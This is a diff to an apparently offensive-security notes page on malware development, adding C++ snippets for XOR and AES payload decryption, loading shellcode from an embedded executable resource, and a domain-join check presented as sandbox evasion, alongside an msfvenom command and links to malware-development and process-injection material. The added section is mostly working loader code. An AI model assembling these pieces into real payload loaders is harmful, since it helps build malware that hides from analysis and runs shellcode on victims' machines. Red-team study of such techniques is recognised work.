@@ -11,6 +11,97 @@ $ msfvenom -p windows/messagebox TITLE="EICAR" TEXT="X5O!P%@AP[4\PZX54(P^)7CC)7}
 
 
 
+## Code Snippets
+
+
+
+### C++
+
+XOR encryption:
+
+```cpp
+void XOR(char* data, size_t data_len) {
+    const char key[] = "abcdefghjiklmnopqrstuvwxyz";
+
+    int j = 0;
+    for (int i = 0; i < data_len; i++) {
+        if (j == sizeof(key) - 1) j = 0;
+        data[i] = data[i] ^ key[j];
+        j++;
+    }
+}
+```
+
+AES encryption:
+
+```cpp
+// Credit: Sektor7 RTO Malware Essential Course
+int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+
+    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return -1;
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return -1;
+    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) return -1;
+    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return -1;
+    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) return -1;
+
+    CryptReleaseContext(hProv, 0);
+    CryptDestroyHash(hHash);
+    CryptDestroyKey(hKey);
+
+    return 0;
+}
+```
+
+Invoke the shellcode [from an embed resource](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources):
+
+```cpp
+HRSRC scResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RESOURCE_BIN1), "RESOURCE_BIN");
+DWORD shellcodeSize = SizeofResource(NULL, scResource);
+HGLOBAL scResourceData = LoadResource(NULL, scResource);
+
+unsigned char* shellcode;
+shellcode = (unsigned char*)malloc(shellcodeSize);
+
+memcpy(shellcode, scResourceData, shellcodeSize);
+```
+
+Check if a machine a domain-joined (sandbox evasion):
+
+{% code title="is_domain_joined.py" %}
+```cpp
+// cl.exe is_domain_joined.cpp netapi32.lib
+#include <Windows.h>
+#include <LM.h>
+#include <iostream>
+
+BOOL IsDomainJoined() {
+	auto joined = false;
+	LPWSTR lpNameBuffer = nullptr;
+	NETSETUP_JOIN_STATUS joinStatus = NETSETUP_JOIN_STATUS::NetSetupUnknownStatus;
+
+	NET_API_STATUS status = NetGetJoinInformation(nullptr, &lpNameBuffer, &joinStatus);
+	if (status == NERR_Success)
+		joined = joinStatus == NETSETUP_JOIN_STATUS::NetSetupDomainName;
+
+	if (lpNameBuffer)
+		NetApiBufferFree(lpNameBuffer);
+
+	return joined;
+}
+
+int main()
+{
+    std::cout << (!IsDomainJoined() ? "No dynamic analysis 4 u" : "Hack the Planet!") << std::endl;
+}
+```
+{% endcode %}
+
+
+
+
 ## Blog Series
 
 
@@ -56,12 +147,3 @@ $ msfvenom -p windows/messagebox TITLE="EICAR" TEXT="X5O!P%@AP[4\PZX54(P^)7CC)7}
 
 - [[PDF] Malware Development for Dummies (Cas van Cooten)](https://github.com/chvancooten/maldev-for-dummies/blob/main/Slides/Malware%20Development%20for%20Dummies%20-%20Hack%20in%20Paris%2030-06-2022%20%26%2001-07-2022.pdf)
 - [https://github.com/chvancooten/maldev-for-dummies](https://github.com/chvancooten/maldev-for-dummies)
-
-
-
-
-## PE Injection
-
-- [https://gist.github.com/hasherezade/e6daa4124fab73543497b6d1295ece10](https://gist.github.com/hasherezade/e6daa4124fab73543497b6d1295ece10)
-- [https://xakep.ru/2018/08/27/doppelganging-process/](https://xakep.ru/2018/08/27/doppelganging-process/)
-- [https://xakep.ru/2022/04/21/herpaderping-and-ghosting/](https://xakep.ru/2022/04/21/herpaderping-and-ghosting/)
